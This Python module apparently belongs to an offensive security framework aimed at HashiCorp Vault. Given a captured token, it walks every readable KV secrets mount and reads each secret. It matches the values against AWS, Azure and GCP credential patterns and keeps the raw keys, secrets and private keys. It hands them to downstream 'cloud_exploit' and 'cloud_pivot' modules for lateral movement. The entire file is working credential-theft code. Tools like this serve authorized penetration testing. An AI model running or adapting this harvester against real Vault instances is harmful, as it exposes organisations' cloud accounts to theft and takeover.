"""Cloud key exfiltration — locate and exfiltrate cloud provider keys from Vault.

Walks every KV secrets engine the captured token can read, then scans secret
values for AWS / Azure / GCP credential material (access keys, client secrets,
service-account keys, connection strings). Discovered credentials are collected
into a finding and stored on ``context.cloud_credentials`` so downstream cloud
modules (``cloud_exploit.exploit`` / ``cloud_pivot.exploit``) can reuse them.
"""

from __future__ import annotations

import re
from typing import Optional

import requests

from core.tls_config import vault_request

from ...context import ExecutionContext
from ...registry import BaseExecutionModule, ExecutionResult, RiskLevel

# Reuse the KV-walking helpers from the secrets-exfiltration module.
from ..secrets.secret_exfiltration import (
    _any_token,
    _discover_kv_mounts,
    _walk_kv_mount,
    _kv_version,
)


TIMEOUT = 10
DEFAULT_MAX_DEPTH = 5


class CloudKeyExfiltrationModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="cloud_key_exfiltration.key_dump",
            title="Cloud Key Exfiltration",
            risk_level=RiskLevel.STATE_CHANGING,
            domain="cloud",
            description=(
                "Enumerates readable KV secrets and extracts AWS, Azure and GCP "
                "credential material (access keys, client secrets, service-account "
                "keys, storage connection strings) for downstream cloud pivoting."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(
            getattr(context, "vault_addr", None)
            and _any_token(context)
        )

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        params = params or {}
        token = _any_token(context)
        if not token:
            return ExecutionResult(
                status="skipped",
                message="Cloud key exfiltration requires a token. Provide --token or run privilege escalation first.",
                evidence={"missing": ["token"]},
            )

        base_url = context.vault_addr.rstrip("/")
        timeout = params.get("timeout", TIMEOUT)
        verify_tls = params.get("verify_tls", getattr(context, "verify_tls", True))
        max_depth = int(params.get("max_depth", DEFAULT_MAX_DEPTH))
        headers = {
            "X-Vault-Token": token,
            "Content-Type": "application/json",
        }
        namespace = params.get("namespace", getattr(context, "namespace", None))
        if namespace:
            headers["X-Vault-Namespace"] = namespace

        try:
            # ── 1. Discover + walk KV mounts, read every accessible secret ──
            kv_mounts = _discover_kv_mounts(base_url, headers, timeout, verify_tls)
            payloads: dict = {}
            errors: list = []
            for mount_name, mount_info in kv_mounts.items():
                _walk_kv_mount(
                    base_url, headers, timeout, verify_tls,
                    mount_name.strip("/"),
                    _kv_version(mount_info),
                    "", 0, max_depth,
                    payloads, errors,
                )

            # ── 2. Scan secret values for cloud credential material ────────
            cloud_creds: list[dict] = []
            for path, payload in payloads.items():
                for key_path, value in _iter_leaf_items(payload):
                    classification = _classify_cloud_credential(key_path, value)
                    if classification:
                        classification["source_path"] = path
                        classification["source_key"] = key_path
                        cloud_creds.append(classification)

            # ── 3. De-duplicate on (provider, cred_type, value) ────────────
            seen = set()
            unique_creds: list[dict] = []
            for cred in cloud_creds:
                dedup_key = (cred.get("provider"), cred.get("cred_type"), cred.get("value"))
                if dedup_key in seen:
                    continue
                seen.add(dedup_key)
                unique_creds.append(cred)

            # ── 4. Store for downstream modules + emit findings ────────────
            if unique_creds:
                context.cloud_credentials = unique_creds
                by_provider: dict = {}
                for cred in unique_creds:
                    by_provider.setdefault(cred.get("provider", "unknown"), []).append(cred)

                context.add_finding(
                    title="CRITICAL: Cloud Credentials Exfiltrated",
                    description=(
                        f"Extracted {len(unique_creds)} cloud credential(s) from Vault "
                        f"KV secrets: " + ", ".join(
                            f"{p} x{len(c)}" for p, c in sorted(by_provider.items())
                        )
                    ),
                    severity="CRITICAL",
                    evidence={
                        "credentials": unique_creds,
                        "by_provider": {p: len(c) for p, c in by_provider.items()},
                        "kv_mounts": sorted(kv_mounts.keys()),
                    },
                )
                return ExecutionResult(
                    status="success",
                    message=f"Exfiltrated {len(unique_creds)} cloud credential(s): " +
                            ", ".join(f"{p} x{len(c)}" for p, c in sorted(by_provider.items())),
                    evidence={
                        "credentials": unique_creds,
                        "by_provider": {p: len(c) for p, c in by_provider.items()},
                    },
                )

            return ExecutionResult(
                status="success",
                message="No cloud credential material found in readable KV secrets.",
                evidence={"kv_mounts": sorted(kv_mounts.keys()), "errors": errors[:20]},
            )

        except requests.RequestException as error:
            return ExecutionResult(
                status="error",
                message=f"Network error during cloud key exfiltration: {error}",
                evidence={"error": str(error)},
            )
        except ValueError as error:
            return ExecutionResult(
                status="error",
                message=f"Invalid Vault response during cloud key exfiltration: {error}",
                evidence={"error": str(error)},
            )


# ─── Cloud credential detection ─────────────────────────────────────────────

_AWS_ACCESS_KEY_RE = re.compile(r'\b(AKIA|ASIA)[0-9A-Z]{16}\b')
_GCP_PEM_RE = re.compile(r'-----BEGIN (?:RSA |EC |)PRIVATE KEY-----')
_AZURE_CONN_STR_RE = re.compile(r'DefaultEndpointsProtocol=https?;')

_AWS_KEY_NAMES = {
    "aws_access_key_id", "access_key_id", "accesskeyid",
    "aws_secret_access_key", "secret_access_key", "secretaccesskey",
    "aws_secret_key", "secret_key",
    "aws_session_token", "session_token", "aws_sessiontoken",
}
_AZURE_KEY_NAMES = {
    "client_secret", "azure_client_secret", "clientsecret",
    "account_key", "azure_storage_key", "storage_account_key",
}
_GCP_KEY_NAMES = {
    "private_key", "gcp_private_key", "google_private_key",
    "service_account", "service_account_key", "google_credentials", "gcp_key",
}
_GENERIC_CLOUD_KEY_NAMES = {
    "cloud_credentials", "cloud_key", "cloud_api_key",
    "access_key", "secretkey", "apikey", "api_key",
}


def _iter_leaf_items(obj, prefix=""):
    """Recursively yield ``(dotted_key_path, str_value)`` for every leaf string."""
    if isinstance(obj, dict):
        for key, value in obj.items():
            child = f"{prefix}.{key}" if prefix else str(key)
            yield from _iter_leaf_items(value, child)
    elif isinstance(obj, list):
        for idx, value in enumerate(obj):
            child = f"{prefix}[{idx}]"
            yield from _iter_leaf_items(value, child)
    else:
        yield prefix, str(obj)


def _classify_cloud_credential(key_path: str, value: str) -> Optional[dict]:
    """Return a credential descriptor if *value* looks like cloud material."""
    key_l = key_path.lower()
    value_s = str(value).strip()
    if not value_s or len(value_s) < 8:
        return None

    # AWS access key ID — strong pattern, ignore key name.
    if _AWS_ACCESS_KEY_RE.search(value_s):
        return {"provider": "aws", "cred_type": "access_key_id", "value": value_s}

    # AWS secret access key / session token — key-name driven (long opaque value).
    if key_l in _AWS_KEY_NAMES:
        if "secret" in key_l and len(value_s) >= 20:
            return {"provider": "aws", "cred_type": "secret_access_key", "value": value_s}
        if "session" in key_l and len(value_s) >= 20:
            return {"provider": "aws", "cred_type": "session_token", "value": value_s}
        if "access_key_id" in key_l or "accesskeyid" in key_l:
            return {"provider": "aws", "cred_type": "access_key_id", "value": value_s}

    # GCP — service-account JSON or PEM private key.
    if _GCP_PEM_RE.search(value_s) or (
        key_l in _GCP_KEY_NAMES
        and ("client_email" in value_s or "private_key" in value_s or "-----BEGIN" in value_s)
    ):
        return {"provider": "gcp", "cred_type": "service_account_key", "value": value_s}

    # Azure — client secret or storage connection string.
    if _AZURE_CONN_STR_RE.search(value_s) and "AccountKey=" in value_s:
        return {"provider": "azure", "cred_type": "storage_connection_string", "value": value_s}
    if key_l in _AZURE_KEY_NAMES and len(value_s) >= 10:
        return {"provider": "azure", "cred_type": "client_secret", "value": value_s}

    # Generic cloud-key name fallback — flag, provider unknown.
    if key_l in _GENERIC_CLOUD_KEY_NAMES and len(value_s) >= 10:
        return {"provider": "unknown", "cred_type": "cloud_key", "value": value_s}

    return None
